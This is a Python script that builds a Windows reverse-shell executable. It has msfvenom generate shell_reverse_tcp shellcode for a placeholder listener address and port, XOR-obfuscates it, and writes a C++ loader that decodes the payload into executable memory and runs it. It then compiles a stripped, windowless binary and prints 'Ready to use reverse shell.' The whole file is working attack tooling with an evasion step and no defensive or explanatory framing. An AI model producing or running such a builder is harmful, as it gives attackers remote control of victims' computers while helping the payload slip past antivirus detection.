import os
import sys
import subprocess

# Configuration
LHOST = "192.168.1.000"
LPORT = 4545
OUTPUT_CPP = "reverse_shell.cpp"
OUTPUT_EXE = "reverse_shell.exe"
XOR_KEY = "mcommon"

def generate_shellcode():
    print("[*] Generating shellcode with msfvenom...")
    try:
        subprocess.run([
            "msfvenom", "-p", "windows/x64/shell_reverse_tcp",
            f"LHOST={LHOST}", f"LPORT={LPORT}",
            "-f", "raw", "-o", "payload.bin"
        ], check=True)
    except Exception as e:
        print(f"[!] Error generating shellcode: {str(e)}")
        sys.exit(1)

def xor_encrypt():
    print("[*] Encrypting payload with XOR...")
    try:
        with open("payload.bin", "rb") as f:
            payload = f.read()
        
        encrypted = [b ^ ord(XOR_KEY[i % len(XOR_KEY)]) 
                    for i, b in enumerate(payload)]
        
        hex_payload = ", ".join(f"0x{b:02x}" for b in encrypted)
        return hex_payload
        
    except Exception as e:
        print(f"[!] Error encrypting payload: {str(e)}")
        sys.exit(1)

def generate_cpp(encrypted_payload):
    cpp_code = f"""#include <windows.h>
#include <string.h>

const char *key = "{XOR_KEY}";

void xor_decrypt(unsigned char *data, size_t data_len) {{
    size_t key_len = strlen(key);
    for(size_t i = 0; i < data_len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

unsigned char payload[] = {{{encrypted_payload}}};

int main() {{
    xor_decrypt(payload, sizeof(payload));
    LPVOID exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec_mem, payload, sizeof(payload));
    ((void(*)())exec_mem)();
    return 0;
}}
"""
    with open(OUTPUT_CPP, "w") as f:
        f.write(cpp_code)
    print(f"[+] C++ code generated: {OUTPUT_CPP}")

def compile_cpp():
    print("[*] Compiling C++ code...")
    try:
        subprocess.run([
            "x86_64-w64-mingw32-g++", OUTPUT_CPP,
            "-o", OUTPUT_EXE,
            "-static", "-lws2_32", "-s", "-Wl,--subsystem,windows"
        ], check=True)
        print(f"[+] Executable compiled: {OUTPUT_EXE}")
    except Exception as e:
        print(f"[!] Error compiling: {str(e)}")
        sys.exit(1)

def cleanup():
    try:
        os.remove("payload.bin")
    except:
        pass

if __name__ == "__main__":
    # 1. Generate shellcode
    generate_shellcode()
    
    # 2. Encrypt payload
    encrypted_payload = xor_encrypt()
    
    # 3. Generate C++ code
    generate_cpp(encrypted_payload)
    
    # 4. Compile
    compile_cpp()
    
    # 5. Cleanup
    cleanup()
    
    print("[+] All done! Ready to use reverse shell.")
